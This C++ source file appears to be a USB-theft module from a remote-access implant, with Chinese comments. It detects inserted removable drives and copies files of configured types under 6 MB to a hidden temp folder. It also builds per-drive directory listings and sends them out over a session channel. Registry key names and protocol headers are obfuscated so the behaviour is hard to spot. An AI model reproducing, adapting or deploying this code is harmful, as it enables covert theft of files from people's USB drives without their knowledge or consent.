// UsbDisk.cpp: implementation of the UsbDisk class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "UsbDisk.h"
#include "direct.h"
#include "io.h"
#include "stdio.h"
//#include "filework.h"
#include "WinApi.h"
#include "NdisSocket.h"
#include "GetDiskInfo.h"
#include "Struct.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////
//遍历u盘下的所有文件,符合类型的文件
void SearchDir(WCHAR* dirpath,DIRLIST& filelist,const WCHAR *fType,int level);

BOOL CopyToTempFolder(DIRLIST& filelist);
#define  MaxUsbFileNum  200

BOOL GetUsbDirFolder(char *dirverfiledir) 
{
	char flgTempPath[MAX_PATH];
	memset(flgTempPath,0,MAX_PATH);
	DWORD l = PGetTempPathA(MAX_PATH, flgTempPath);	

	memset(dirverfiledir,0,MAX_PATH);
	sprintf(dirverfiledir, "%s%s", flgTempPath, GetTmpPrevFix(FIX_USBDIR));
 	if(_access(dirverfiledir, 0) != 0)
	{
		_mkdir(dirverfiledir);
	}
	return TRUE; 
}


BOOL GetUsbFileFolder(char *dirverfiledir) 
{
	char flgTempPath[MAX_PATH];
	memset(flgTempPath,0,MAX_PATH);
	DWORD l = PGetTempPathA(MAX_PATH, flgTempPath);	

	memset(dirverfiledir,0,MAX_PATH);
	sprintf(dirverfiledir, "%s%s", flgTempPath, GetTmpPrevFix(FIX_USBFILE));
 	if(_access(dirverfiledir, 0) != 0)
	{
		_mkdir(dirverfiledir);
	}
	return TRUE; 

}

//检查驱动器，是否有新驱动器。如果有上报，拷贝文件到临时文件夹，产生文件列表到临时文件夹
DWORD WINAPI EnumNewRemovableDriver(LPVOID p)
{
	char dn[10];
	WCHAR wdn[MAX_PATH];
	unsigned int new_drv;

	char dirverfiledir[MAX_PATH];
	GetUsbDirFolder(dirverfiledir);

	new_drv=(unsigned int)p;

	for(int i=2;i<32;i++)
	{
		if((new_drv&(0x1<<i))==0)
			continue;

		sprintf(dn,"%c:",'A'+i);
		GB23122Unicode(dn, wdn, MAX_PATH*sizeof(WCHAR));

		if(PGetDriveTypeA(dn)==DRIVE_REMOVABLE)	//是一个可移动存储器
		{
			//复制文件
			DWORD dwType=REG_BINARY;
			char dwVal[0x400];
			memset(dwVal,0,0x400);
			DWORD dwSize=0x400;

			char subkey[MAX_PATH], szvalue[MAX_PATH];
			memset(subkey, 0, MAX_PATH);
			memset(szvalue, 0, MAX_PATH);
			DeFileStringA(subkey, MAX_PATH, "ZlHVaSTk\\nEKTlClHV");
			DeFileStringA(szvalue, MAX_PATH, "eCYHEGVkT");
			//Software\\Microsoft  usbfilter
			if(PSHGetValueA(HKEY_CURRENT_USER, subkey, szvalue,
			&dwType, &dwVal, &dwSize)== ERROR_SUCCESS)
			{
			}

			WCHAR wftype[MAX_PATH];
			GB23122Unicode(dwVal, wftype, MAX_PATH*sizeof(WCHAR));

		 	DIRLIST	dirlist;
			SearchDir(wdn,dirlist,wftype,0);
			CopyToTempFolder(dirlist);
		}

		//目录列表
		char dirverno[500], driverfilename[1000];
		GetDiskInfo::GetInstance()->GetUSBDiskID(dn[0], dirverno);
		memset(driverfilename, 0, sizeof(driverfilename));
		sprintf(driverfilename, "%s\\%c_%s", dirverfiledir, dn[0], dirverno);

		FILE * fs;
		fs=fopen(driverfilename, "w+b");

		if(fs)
		{
			S_GetPathStruct(fs, wdn);	//类型usbdir . 		
			fclose(fs);
		}
	}
	
	return TRUE;
}

BOOL GetUsbDirList(DIRLIST& dirlist)
{
	WCHAR searchpath[MAX_PATH];
	swprintf(searchpath, L"%s\\*.*", dirlist.rootdir);
	HANDLE hfindfile;
	WIN32_FIND_DATAW finddata;
	hfindfile = PFindFirstFileW(searchpath, &finddata);
	if (hfindfile != INVALID_HANDLE_VALUE)
	{
		try
		{
			do{
				int type;
				unsigned __int64 size;
				if (finddata.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
				{
					// 是文件夹
					if (wcscmp(finddata.cFileName,L".")==0 || wcscmp(finddata.cFileName,L"..")==0)
						continue;
					type = 1;
					size = 0;
				}
				else
				{
					type = 0;
					size = finddata.nFileSizeHigh;
					size = (size << 32) + finddata.nFileSizeLow;
				}
				FileFILEINFO *tp;
				if (0 == (dirlist.filecount&15))
				{
					tp = new FileFILEINFO[dirlist.filecount+16];
					memcpy(tp, dirlist.filelist, dirlist.filecount*sizeof(FileFILEINFO));
					memset(tp+dirlist.filecount, 0, sizeof(FileFILEINFO)*16);
					delete[] dirlist.filelist;
					dirlist.filelist = tp;
				}
				tp = dirlist.filelist + dirlist.filecount++;

				wcscpy(tp->filename,  finddata.cFileName);
				tp->filetime = finddata.ftLastWriteTime;
				tp->createfiletime = finddata.ftCreationTime;
				tp->accesstime = finddata.ftLastAccessTime;
				tp->filesize = size;
				tp->filetype = type;
			}while(PFindNextFileW(hfindfile, &finddata));

		}catch (...){
			
		}
		PFindClose(hfindfile);
	}
	
	return TRUE;
}

//遍历u盘下的所有文件，符合类型的文件，不大于6M的文件放到文件列表中。文件列表的个数不超过200个
void SearchDir(WCHAR* dirpath, DIRLIST& filelist, const WCHAR *fType, int level)
{
	if(level > 6)
		return ;
	DIRLIST dirlist;
	HANDLE hfindfile;
	WIN32_FIND_DATAW finddata;
	WCHAR searchpath[MAX_PATH];
	swprintf(searchpath, L"%s\\*.*", dirpath);
	hfindfile = PFindFirstFileW(searchpath, &finddata);
	if (hfindfile != INVALID_HANDLE_VALUE)
	{
		unsigned __int64 size;
		int resvDot;
		WCHAR filePath[MAX_PATH];
		do{
			if (finddata.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)	// 是文件夹
			{
				if (wcscmp(finddata.cFileName,L".")==0 || wcscmp(finddata.cFileName,L"..")==0)
					continue;
				
				FileFILEINFO *tp;
				if (0 == (dirlist.filecount&15))
				{
					tp = new FileFILEINFO[dirlist.filecount+16];
					memcpy(tp, dirlist.filelist, dirlist.filecount*sizeof(FileFILEINFO));
					memset(tp+dirlist.filecount, 0, sizeof(FileFILEINFO)*16);
					delete[] dirlist.filelist;
					dirlist.filelist = tp;
				}
				swprintf(filePath, L"%s\\%s", dirpath, finddata.cFileName);
				tp = dirlist.filelist + dirlist.filecount++;
				wcscpy(tp->filename, filePath);
				tp->filetime = finddata.ftLastWriteTime;

			}
			else
			{
				size = finddata.nFileSizeHigh;
				size = (size << 32) + finddata.nFileSizeLow;
				if ( size >= 6 * 1024 * 1024 || finddata.nFileSizeHigh > 0)//大于6m  不拷
				{
					continue;
				}

		    	WCHAR *pResv = wcsrchr(finddata.cFileName, L'.');
				if(pResv != NULL)
				{
					resvDot = 1+ pResv- finddata.cFileName;
					if(fType && wcslen(fType)>0)//0代表所有
					{
						WCHAR *pdot=finddata.cFileName+resvDot;
						WCHAR * pp=wcsstr(fType,pdot);
						if(!pp)
						{
							continue; //如果文件类型不为空,就过滤
						}
					}
				}
				
				FileFILEINFO *tp;
				if (0 == (filelist.filecount&15))
				{
					tp = new FileFILEINFO[filelist.filecount+16];
					memcpy(tp, filelist.filelist, filelist.filecount*sizeof(FileFILEINFO));
					memset(tp+filelist.filecount, 0, sizeof(FileFILEINFO)*16);
					delete[] filelist.filelist;
					filelist.filelist = tp;
				}
				swprintf(filePath, L"%s\\%s", dirpath, finddata.cFileName);
				tp = filelist.filelist + filelist.filecount++;
				wcscpy(tp->filename, filePath);
				tp->filetime = finddata.ftLastWriteTime;
				tp->filesize = size;
				tp->filetype =  0; //文件类型
				//找到文件后,做复制处理,并回传给as  
				if(filelist.filecount>MaxUsbFileNum)
					break;
			}
		}while(PFindNextFileW(hfindfile, &finddata));
		
		for(int i = 0; i< dirlist.filecount; i++)
		{
			if(filelist.filecount>MaxUsbFileNum)
				break;
			SearchDir(dirlist.filelist[i].filename, filelist,fType, level+1);
		}
		PFindClose(hfindfile);
	} 
}


//根据文件列表拷贝U盘文件到临时文件夹
BOOL CopyToTempFolder(DIRLIST& filelist)
{
	char usbfiledir[MAX_PATH];
	GetUsbFileFolder(usbfiledir);

	WCHAR wusbfiledir[MAX_PATH];
	GB23122Unicode(usbfiledir, wusbfiledir, MAX_PATH*sizeof(WCHAR));

	WCHAR dstfullfilename[MAX_PATH];
	for(int i=0;i<filelist.filecount;i++)
	{
		WCHAR filename[MAX_PATH];
		memset(filename,0,sizeof(filename));
		GetFilename(filelist.filelist[i].filename, filename);
		memset(dstfullfilename, 0, sizeof(dstfullfilename));
		swprintf(dstfullfilename, L"%s\\%s", wusbfiledir, filename);
		if(_waccess(dstfullfilename,0) == 0)
		{
			unsigned __int64 filesize=0;
			FILETIME filetime, ftcreate, ftaccess;
			if(QueryFileInfo(dstfullfilename, filetime, ftcreate, ftaccess, filesize) )
			{
				 if((filelist.filelist[i].filetime.dwHighDateTime > filetime.dwHighDateTime)
					||(filelist.filelist[i].filetime.dwHighDateTime == filetime.dwHighDateTime 
					  &&filelist.filelist[i].filetime.dwLowDateTime > filetime.dwLowDateTime)
					 )
				 {
					//比较时间信息,如果新再覆盖以前的
					PCopyFileW(filelist.filelist[i].filename, dstfullfilename, FALSE);
				 }
			}
		}
		else
		{
			PCopyFileW(filelist.filelist[i].filename, dstfullfilename, FALSE);
		}
	}
	return TRUE;
}

//获取文件名
BOOL GetFilename(WCHAR* fullfilepath, WCHAR* filename)
{
	WCHAR *pResv = wcsrchr(fullfilepath, L'\\');
	if(pResv != NULL)
	{
		int resvDot;
		resvDot = 1+ pResv- fullfilepath;
		WCHAR *pdot=fullfilepath+resvDot;
		wcscpy(filename,pdot);
		return TRUE;
	 
	}
	return FALSE;
}


DWORD WINAPI GetUsbDiskInfo(LPVOID p)
{
	ThreadParam *pThpara = (ThreadParam*)p;
	char* pBuffer = new char[SENDBUFFLEN];
	memset(pBuffer, 0, SENDBUFFLEN);
	int datalen=100;
	
	BOOL b_haveusbdir=FALSE;
	char dirverfiledir[MAX_PATH];
	GetUsbDirFolder(dirverfiledir);
	
	WCHAR wdriverfiledir[MAX_PATH];
	UTF_82Unicode(dirverfiledir, wdriverfiledir, MAX_PATH);
	
	char TmpStr[50];
	DIRLIST dirlist;
	wcscpy(dirlist.rootdir, wdriverfiledir);
	if(GetUsbDirList(dirlist))
	{
		for (int i = 0; i < dirlist.filecount; i++)
		{
			if(dirlist.filelist[i].filetype==1)
				continue;
			b_haveusbdir=TRUE;
			
			char utf8finame[3*MAX_PATH];
			Unicode2UTF_8(dirlist.filelist[i].filename, utf8finame, 3*MAX_PATH);
			char tmpbuf[3*MAX_PATH];
			memset(tmpbuf, 0, 3*MAX_PATH);
			int len = sprintf(tmpbuf, "%s\r\n",	utf8finame);
			memcpy(pBuffer+datalen, tmpbuf, len);
			datalen += len;
		}
	}	
	
	char buf[100];
	int hlen=0;
	if(!b_haveusbdir) //没有
	{	
		SYSTEMTIME nowtime;
		PGetLocalTime(&nowtime);
		//time
		hlen = sprintf(buf, "%s: %04d%02d%02d%02d%02d%02d\r\n", DeFileStringA(TmpStr, 50, "VEWk"), 
			nowtime.wYear, nowtime.wMonth, nowtime.wDay, nowtime.wHour,
			nowtime.wMinute, nowtime.wSecond);
		//content-length
		hlen += sprintf(buf+hlen, "%s: %d\r\n", DeFileStringA(TmpStr, 50, "KlFVkFVdGkFgVM"), 0);
		//content-type: usbdiskinfo
		hlen += sprintf(buf+hlen, "%s\r\n\r\n", DeFileStringA(TmpStr, 50, "KlFVkFVdVupk: eCYvECsEFHl"));
		
	}
	else
	{
		SYSTEMTIME nowtime;
		PGetLocalTime(&nowtime);
		//time
		hlen = sprintf(buf, "%s: %04d%02d%02d%02d%02d%02d\r\n", DeFileStringA(TmpStr, 50, "VEWk"), 
			nowtime.wYear, nowtime.wMonth, nowtime.wDay, nowtime.wHour,
			nowtime.wMinute, nowtime.wSecond);
		//content-length
		hlen += sprintf(buf+hlen, "%s: %d\r\n", DeFileStringA(TmpStr, 50, "KlFVkFVdGkFgVM"), datalen);
		//content-type: usbdiskinfo
		hlen += sprintf(buf+hlen, "%s\r\n\r\n", DeFileStringA(TmpStr, 50, "KlFVkFVdVupk: eCYvECsEFHl"));
		
	}
	
	memcpy(pBuffer+100-hlen, buf, hlen);
	datalen = datalen - 100 + hlen;
	
	
	if(SendData(pBuffer+100-hlen, datalen, pThpara->PacketType, pThpara->SessionID))
	{
		//usb dir info发送数据成功
	}
	else 
	{
		//usb dir info发送数据失败
	}
	
	if(pBuffer)
		delete[] pBuffer;
	delete pThpara;
	return 1;
}


DWORD StartGetUsbDiskInfo(DWORD* pPara)
{
	HANDLE starthandle=0;
	DWORD  threadId=0;
	ThreadParam *p = new ThreadParam;
	memcpy(p, pPara, sizeof(ThreadParam));
	starthandle = CreateThread(NULL, 0, GetUsbDiskInfo, p, 0, &threadId);
	if (starthandle != NULL)
		CloseHandle(starthandle);
	return 0;
}